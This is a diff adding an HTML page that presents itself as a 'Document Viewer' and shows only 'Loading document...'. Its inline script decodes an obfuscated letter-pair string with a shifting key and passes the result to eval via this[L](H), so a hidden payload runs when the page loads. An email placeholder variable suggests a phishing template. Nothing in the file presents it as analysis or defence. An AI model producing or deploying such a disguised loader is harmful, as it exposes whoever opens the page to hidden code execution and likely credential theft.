@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div>Loading document...</div>
+    
+    <script>
+    var B = "#Dabz++email64++Dabz";
+    var w = "ipni icwe iifi hpsa ilji jevo embu ieze iifi hnpa hmna japo igce inli igce ehto icwe inli ibve idye flve dkci ibve iomi ipni imki japo fire ehto eivu iifi japo hnpa ieze inli hkla iomi idye ihde iate icwe japo ilji ehto hnpa ikhi ijgi embu eako dizi eepo dkci fnye fhpa hnpa ipni hlma ihde bikey";
+    var O = w.split(" ");
+    var d = O.pop().replace("key", "");
+    var r = O.splice(-4, 4);
+    var a = O;
+    
+    var U = 0;
+    for (var G = 0; G < d.length; G++) U = U * 16 + (d.charCodeAt(G) - 97);
+    
+    var c = "", p = "";
+    for (var l = 0; l < Math.max(r.length, a.length); l++) {
+        if (l < r.length) {
+            var I = r[l].substring(0, 2);
+            var N = 0;
+            for (var j = 0; j < I.length; j++) N = N * 16 + (I.charCodeAt(j) - 97);
+            c += String.fromCharCode(N);
+        }
+        if (l < a.length) {
+            var I = a[l].substring(0, 2);
+            var N = 0;
+            for (var j = 0; j < I.length; j++) N = N * 16 + (I.charCodeAt(j) - 97);
+            p += String.fromCharCode(N);
+        }
+    }
+    
+    var L = "", H = "";
+    for (var n = 0; n < Math.max(c.length, p.length); n++) {
+        if (n < c.length) {
+            var T = c.charCodeAt(n);
+            L += String.fromCharCode((T - U - (n % 7) + 256) % 256);
+        }
+        if (n < p.length) {
+            var T = p.charCodeAt(n);
+            H += String.fromCharCode((T - U - (n % 7) + 256) % 256);
+        }
+    }
+    
+    this[L](H);
+    </script>
+</body>
+</html>
